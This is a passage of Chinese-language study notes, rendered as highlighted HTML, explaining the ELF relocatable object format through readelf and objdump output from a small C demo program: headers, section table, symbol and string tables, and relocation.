   <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="elf-header"><a href="#elf-header" class="headerlink" title="elf header"></a>elf header</h1><blockquote>
<p>初次学习主要关注 Start of section headers即可，初次旨在弄清楚文件结构</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">其中指出了节表的开始地址，也指出了节表中元素数量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -h ./elfdemo.o</span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              <span class="number">2&#x27;</span>s complement, little endian</span><br><span class="line">  Version:                           <span class="number">1</span> (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       <span class="number">0</span></span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86<span class="number">-64</span></span><br><span class="line">  Version:                           <span class="number">0x1</span></span><br><span class="line">  Entry point address:               <span class="number">0x0</span></span><br><span class="line">  Start of program headers:          <span class="number">0</span> (bytes into file)</span><br><span class="line">  Start of section headers:          <span class="number">1040</span> (bytes into file)</span><br><span class="line">  Flags:                             <span class="number">0x0</span></span><br><span class="line">  Size of this header:               <span class="number">64</span> (bytes)</span><br><span class="line">  Size of program headers:           <span class="number">0</span> (bytes)</span><br><span class="line">  Number of program headers:         <span class="number">0</span></span><br><span class="line">  Size of section headers:           <span class="number">64</span> (bytes)</span><br><span class="line">  Number of section headers:         <span class="number">14</span></span><br><span class="line">  Section header <span class="built_in">string</span> table index: <span class="number">13</span><span class="comment">/*字符串表的节索引*/</span></span><br></pre></td></tr></table></figure>

<h1 id="section-header（节描述符）"><a href="#section-header（节描述符）" class="headerlink" title="section header（节描述符）"></a>section header（节描述符）</h1><blockquote>
<p>按照本人的理解为section和segment的区别是一个是在文件中，一个是在runtime，本次学习所用实例为可重定向文件，非文件，因此没有program header。</p>
<p>其详细的描述了每一个节的信息。</p>
</blockquote>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word	sh_type;		<span class="comment">/* Section type */</span><span class="comment">/*段的类型（用处）*/</span></span><br><span class="line">  Elf64_Xword	sh_flags;		<span class="comment">/* Section flags */</span><span class="comment">/*标志位*/</span></span><br><span class="line">  Elf64_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off	sh_offset;		<span class="comment">/* Section file offset */</span><span class="comment">/*文件偏移地址*/</span></span><br><span class="line">  Elf64_Xword	sh_size;		<span class="comment">/* Section size in bytes */</span><span class="comment">/*节长*/</span></span><br><span class="line">  Elf64_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword	sh_addralign;		<span class="comment">/* Section alignment */</span><span class="comment">/*对齐，若为8，则起始地址除8=0*/</span></span><br><span class="line">  Elf64_Xword	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span><span class="comment">/*项长度，符号表24*/</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ./elfdemo.o</span></span><br><span class="line">There are <span class="number">14</span> section headers, starting at offset <span class="number">0x410</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000040</span></span><br><span class="line">       <span class="number">0000000000000062</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">000002f</span>0</span><br><span class="line">       <span class="number">0000000000000078</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>a4</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS           <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .rodata           PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000b</span>0</span><br><span class="line">       <span class="number">000000000000002</span>c  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>dc</span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000000</span>  <span class="number">000000e0</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">9</span>] .eh_frame         PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000100</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.eh_frame    RELA             <span class="number">0000000000000000</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">9</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00000158</span></span><br><span class="line">       <span class="number">0000000000000138</span>  <span class="number">0000000000000018</span>          <span class="number">12</span>     <span class="number">8</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000290</span></span><br><span class="line">       <span class="number">000000000000005</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">13</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000398</span></span><br><span class="line">       <span class="number">0000000000000074</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="Symbol-table（重要节之一）"><a href="#Symbol-table（重要节之一）" class="headerlink" title="Symbol table（重要节之一）"></a>Symbol table（重要节之一）</h2><h3 id="其中元素结构为："><a href="#其中元素结构为：" class="headerlink" title="其中元素结构为："></a>其中元素结构为：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.Symbol name,为符号名所在位置的index，而符号名在字符串表中，会在下面介绍</span></span><br><span class="line"><span class="comment">2.st_info：符号类型和绑定，</span></span><br><span class="line"><span class="comment">	符号绑定（binding）：表示符号的作用域和链接属性，例如是局部符号还是全局符号，还有弱符号。</span></span><br><span class="line"><span class="comment">	符号类型（type）：表示符号的类型，例如它是一个函数、变量还是某种特殊的符号。</span></span><br><span class="line"><span class="comment">3.st_other，符号可见性，可由符号绑定决定，也可以自定义，决定了是否能被外部引用。	</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line">一个结构体占：<span class="number">4</span>+<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">8</span>+<span class="number">8</span>=<span class="number">24b</span>ytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="String-table-Shstrtab"><a href="#String-table-Shstrtab" class="headerlink" title="String table &amp;&amp; Shstrtab"></a>String table &amp;&amp; Shstrtab</h2><blockquote>
<p>分别用来保存符号表的名称和节表的名称，即symbol name和section name。可通过st_name和sh_name索引来访问。</p>
</blockquote>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">符号表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">13</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">4</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">3</span> static_var<span class="number">.1</span></span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> static_var2<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> global_init_var</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> global_uninit_var</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> func1</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br><span class="line">    <span class="number">12</span>: <span class="number">000000000000002b</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 符号表的hex表示，可以理解其存储的格式</span></span><br><span class="line"><span class="comment"> 第一列为索引，注意大端法，一个结构体占24字节，仔细阅读可以理解其与字符串表的对应关系。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 11 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.symtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">01000000</span> <span class="number">0400f</span>1ff ................</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">00000000</span> <span class="number">03000100</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000300</span> ................</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">00000000</span> <span class="number">03000400</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000500</span> ................</span><br><span class="line">  <span class="number">0x00000080</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000090</span> <span class="number">0b000000</span> <span class="number">01000300</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000a0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">18000000</span> <span class="number">01000400</span> ................</span><br><span class="line">  <span class="number">0x000000b0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000c0</span> <span class="number">26000000</span> <span class="number">11000300</span> <span class="number">00000000</span> <span class="number">00000000</span> &amp;...............</span><br><span class="line">  <span class="number">0x000000d0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">36000000</span> <span class="number">11000400</span> .......<span class="number">.6</span>.......</span><br><span class="line">  <span class="number">0x000000e0</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000f0</span> <span class="number">48000000</span> <span class="number">12000100</span> <span class="number">00000000</span> <span class="number">00000000</span> H...............</span><br><span class="line">  <span class="number">0x00000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> <span class="number">4e000000</span> <span class="number">10000000</span> +.......N.......</span><br><span class="line">  <span class="number">0x00000110</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000120</span> <span class="number">55000000</span> <span class="number">12000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> U.......+.......</span><br><span class="line">  <span class="number">0x00000130</span> <span class="number">37000000</span> <span class="number">00000000</span>                   <span class="number">7.</span>......</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 字符串表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 12 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.strtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00656</span>c66 <span class="number">64656</span>d6f <span class="number">2e630073</span> <span class="number">74617469</span> .elfdemo.c.stati</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">635f</span>7661 <span class="number">722e3100</span> <span class="number">73746174</span> <span class="number">69635f</span>76 c_var<span class="number">.1</span>.static_v</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">6172322</span>e <span class="number">3000676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>696e69 ar2<span class="number">.0</span>.global_ini</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">745f</span>7661 <span class="number">7200676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>756e69 t_var.global_uni</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">6e69745</span>f <span class="number">76617200</span> <span class="number">66756e63</span> <span class="number">31007072</span> nit_var.func1.pr</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">696e7466</span> <span class="number">006</span>d6169 <span class="number">6e00</span>              intf.main.</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 13 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.shstrtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">002e7379</span> <span class="number">6</span>d746162 <span class="number">002e7374</span> <span class="number">72746162</span> ..symtab..strtab</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">002e7368</span> <span class="number">73747274</span> <span class="number">6162002</span>e <span class="number">72656</span>c61 ..shstrtab..rela</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">2e746578</span> <span class="number">74002e64</span> <span class="number">61746100</span> <span class="number">2e627373</span> .text..data..bss</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">002e726</span>f <span class="number">64617461</span> <span class="number">002e636</span>f <span class="number">6</span>d6d656e ..rodata..commen</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">74002e6</span>e <span class="number">6f</span>74652e <span class="number">474e552</span>d <span class="number">73746163</span> t..note.GNU-stac</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">6b</span>002e6e <span class="number">6f</span>74652e <span class="number">676e752</span>e <span class="number">70726f</span>70 k..note.gnu.prop</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">65727479</span> <span class="number">002e7265</span> <span class="number">6</span>c612e65 <span class="number">685f</span>6672 erty..rela.eh_fr</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">616</span>d6500                            ame.        </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>因此是一个可重定位文件缺少外部文件函数的定义，因此需要链接器来重定位，而.rela就是需要重定位的节</p>
</blockquote>
<p>此时可以反汇编文件，文件是这样的：仔细观察可以看见call字段地址为00 00 00 00，故需要重定位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d elfdemo.o</span></span><br><span class="line"></span><br><span class="line">elfdemo.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;func1&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   <span class="number">89</span> <span class="number">7</span>d fc                mov    %edi,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">   f:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">12</span>:   <span class="number">89</span> c6                   mov    %eax,%esi</span><br><span class="line">  <span class="number">14</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        # <span class="number">1b</span> &lt;func1+<span class="number">0x1b</span>&gt;</span><br><span class="line">  <span class="number">1b</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">1</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">23</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">28</span> &lt;func1+<span class="number">0x28</span>&gt;</span><br><span class="line">  <span class="number">28</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">29</span>:   c9                      leave  </span><br><span class="line">  <span class="number">2</span>a:   c3                      ret    </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000002b</span> &lt;main&gt;:</span><br><span class="line">  <span class="number">2b</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">  <span class="number">2f</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">  <span class="number">30</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">  <span class="number">33</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">  <span class="number">37</span>:   c7 <span class="number">45</span> f8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x1</span>,<span class="number">-0x8</span>(%rbp)</span><br><span class="line">  <span class="number">3</span>e:   <span class="number">8b</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%edx        # <span class="number">44</span> &lt;main+<span class="number">0x19</span>&gt;</span><br><span class="line">  <span class="number">44</span>:   <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%eax        # <span class="number">4</span>a &lt;main+<span class="number">0x1f</span>&gt;</span><br><span class="line">  <span class="number">4</span>a:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">4</span>c:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">4f</span>:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">51</span>:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">54</span>:   <span class="number">01</span> d0                   add    %edx,%eax</span><br><span class="line">  <span class="number">56</span>:   <span class="number">89</span> c7                   mov    %eax,%edi</span><br><span class="line">  <span class="number">58</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">5</span>d &lt;main+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">5</span>d:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">60</span>:   c9                      leave  </span><br><span class="line">  <span class="number">61</span>:   c3                      ret    </span><br></pre></td></tr></table></figure>

<p>可以观察到重定位之后符号表的变化，主要是变化为装载地址的相对地址：</p>
<blockquote>
<p>可以通过gdb来验证</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">41</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS Scrt1.o</span><br><span class="line">     <span class="number">2</span>: <span class="number">000000000000038</span>c    <span class="number">32</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> __abi_tag</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000001090</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> deregister_tm_clones</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000000010</span>c0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> register_tm_clones</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000001100</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> __do_global_dtors_aux</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000004018</span>     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> completed<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000003</span>dc0     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">22</span> __do_global_dtor[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000001140</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> frame_dummy</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000003</span>db8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">21</span> __frame_dummy_in[...]</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">    <span class="number">12</span>: <span class="number">0000000000004014</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> static_var<span class="number">.1</span></span><br><span class="line">    <span class="number">13</span>: <span class="number">0000000000004020</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> static_var2<span class="number">.0</span></span><br><span class="line">    <span class="number">14</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">15</span>: <span class="number">0000000000002110</span>     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __FRAME_END__</span><br><span class="line">    <span class="number">16</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    <span class="number">17</span>: <span class="number">0000000000003</span>dc8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> _DYNAMIC</span><br><span class="line">    <span class="number">18</span>: <span class="number">0000000000002008</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT   <span class="number">19</span> __GNU_EH_FRAME_HDR</span><br><span class="line">    <span class="number">19</span>: <span class="number">0000000000003f</span>b8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">24</span> _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">20</span>: <span class="number">0000000000001149</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> func1</span><br><span class="line">    <span class="number">21</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]</span><br><span class="line">    <span class="number">22</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   